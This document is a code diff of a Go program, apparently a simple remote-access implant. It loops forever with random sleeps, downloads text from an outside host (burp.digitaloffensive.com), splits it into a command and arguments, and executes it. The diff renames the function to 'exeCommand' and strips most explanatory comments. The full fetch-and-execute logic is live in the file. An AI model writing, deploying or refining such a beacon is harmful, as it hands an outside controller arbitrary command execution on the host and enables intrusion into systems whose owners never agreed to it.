@@ -12,7 +12,6 @@ import (
 )
 
 func main() {
-        // Seed the random number generator with the current time
         rand.Seed(time.Now().UnixNano())
 
         for {
@@ -22,30 +21,26 @@ func main() {
                 time.Sleep(sleepDuration)
 
                 // Run the command
-                runCommand()
+                exeCommand()
         }
 }
 
-func runCommand() {
-// Specify the URL of the text file to download
+func exeCommand() {
+// Get the commands
     fileURL := "http://burp.digitaloffensive.com"
-
-// Download the file
     response, err := http.Get(fileURL)
     if err != nil {
         fmt.Printf("Error downloading file: %v\n", err)
         return
     }
     defer response.Body.Close()
-
-// Read the file contents into a byte slice
+        
     fileBytes, err := ioutil.ReadAll(response.Body)
     if err != nil {
         fmt.Printf("Error reading file: %v\n", err)
         return
     }
-
-// Convert the byte slice to a string
+        
     cmdContent := string(fileBytes)
 
 // Uncomment to test what the command looks like
@@ -55,9 +50,7 @@ func runCommand() {
         args := strings.Split(cmdContent, " ")
 
 // Command Execution
-        //cmd := exec.Command(cmdContent)
         cmd := exec.Command(args[0], args[1:]...)
-        // Run the command and get the output
         output, err := cmd.Output()
         if err != nil {
                 fmt.Printf("Error running command: %v\n", err)
